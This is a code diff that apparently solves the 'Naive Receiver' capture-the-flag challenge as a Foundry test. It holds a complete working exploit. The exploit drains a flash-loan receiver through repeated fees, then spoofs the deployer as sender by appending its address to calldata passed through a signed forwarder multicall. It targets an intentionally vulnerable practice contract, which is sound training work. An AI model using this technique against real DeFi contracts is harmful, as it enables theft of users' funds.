@@ -77,7 +77,31 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        /// send WETH as fee to pool.
+        bytes[] memory data = new bytes[](11);
+        for (uint256 i = 0; i < 10; i++) {
+            data[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 1 ether, "");
+        }
+        /// add deployer addr as last 20 bytes of data.
+        data[10] = abi.encodePacked(abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, recovery), deployer);
         
+        BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0 ether,
+            gas: 500000,
+            nonce: 0,
+            data: abi.encodeWithSelector(pool.multicall.selector, data),
+            deadline: block.timestamp + 100
+        });
+
+        /// create signature
+        bytes32 digest = getTypedDataHash(forwarder.domainSeparator(), forwarder.getDataHash(req));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+
+        forwarder.execute(req, signature);
     }
 
     /**
@@ -95,5 +119,21 @@ contract NaiveReceiverChallenge is Test {
 
         // All funds sent to recovery account
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+    }
+
+    // util
+    function getTypedDataHash(bytes32 domainSeparator, bytes32 _dataHash)
+        public
+        pure
+        returns (bytes32)
+    {
+        return
+            keccak256(
+                abi.encodePacked(
+                    "\x19\x01",
+                    domainSeparator,
+                    _dataHash
+                )
+            );
     }
 }
